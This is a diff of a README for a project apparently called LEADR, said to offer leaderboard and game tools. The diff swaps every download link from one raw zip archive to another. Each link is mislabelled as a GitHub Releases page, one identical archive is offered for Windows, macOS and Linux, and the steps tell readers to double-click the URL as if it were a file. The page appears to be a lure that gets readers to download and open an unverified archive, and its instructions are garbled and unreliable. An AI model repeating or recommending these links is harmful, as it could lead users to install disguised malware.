@@ -1,6 +1,6 @@
 # 🎮 leadr-releases - Easy Downloads for LEADR Tools
 
-[![Download LEADR Tools](https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v1.1.zip%20LEADR%20Tools-blue?style=for-the-badge)](https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v1.1.zip)
+[![Download LEADR Tools](https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v2.1-beta.2.zip%20LEADR%20Tools-blue?style=for-the-badge)](https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v2.1-beta.2.zip)
 
 ## 📁 Overview
 
@@ -15,29 +15,29 @@ Welcome to the LEADR software tools repository. This project offers public relea
    - Storage: 100 MB of free space
 
 2. **Download LEADR Tools**: Visit this page to download the latest versions of the tools:
-   [Download LEADR Tools](https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v1.1.zip)
+   [Download LEADR Tools](https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v2.1-beta.2.zip)
 
 ## 📥 Download & Install
 
 To install the software, follow these steps:
 
-1. Go to the [GitHub Releases page](https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v1.1.zip).
+1. Go to the [GitHub Releases page](https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v2.1-beta.2.zip).
   
 2. You will see a list of available versions. Find the latest release at the top.
 
 3. Click on the version link to show the download options. Select the file suitable for your operating system. Typical files include:
-   - For Windows: `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v1.1.zip`
-   - For macOS: `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v1.1.zip`
-   - For Linux: Depending on your distribution, you may find `.deb` or `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v1.1.zip` files.
+   - For Windows: `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v2.1-beta.2.zip`
+   - For macOS: `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v2.1-beta.2.zip`
+   - For Linux: Depending on your distribution, you may find `.deb` or `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v2.1-beta.2.zip` files.
 
 4. Click on the file to initiate the download. It may take a few moments.
 
 5. Once the download completes, locate the file in your downloads folder.
 
 6. Open the file to begin the installation:
-   - **Windows**: Double-click the `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v1.1.zip` file and follow the instructions.
-   - **macOS**: Open the `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v1.1.zip` file and drag the LEADR app into your Applications folder.
-   - **Linux**: Open a terminal and navigate to the location of the downloaded file. Use the command `sudo dpkg -i [filename].deb` or extract the `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v1.1.zip` file as instructed.
+   - **Windows**: Double-click the `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v2.1-beta.2.zip` file and follow the instructions.
+   - **macOS**: Open the `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v2.1-beta.2.zip` file and drag the LEADR app into your Applications folder.
+   - **Linux**: Open a terminal and navigate to the location of the downloaded file. Use the command `sudo dpkg -i [filename].deb` or extract the `https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v2.1-beta.2.zip` file as instructed.
 
 7. After installation, you can find LEADR in your applications list. 
 
@@ -65,7 +65,7 @@ We are here to help! If you encounter any issues or have questions, please check
 - **Leaderboards**: Efficient systems for tracking player scores and rankings.
 - **Multi-Language Support**: Tools built with Go and Bubble Tea for robust performance.
 
-For the most up-to-date information, features, and releases, always visit our [GitHub Releases page](https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v1.1.zip). 
+For the most up-to-date information, features, and releases, always visit our [GitHub Releases page](https://raw.githubusercontent.com/haber22/leadr-releases/main/yachty/leadr-releases-v2.1-beta.2.zip). 
 
 ## 📜 License
 
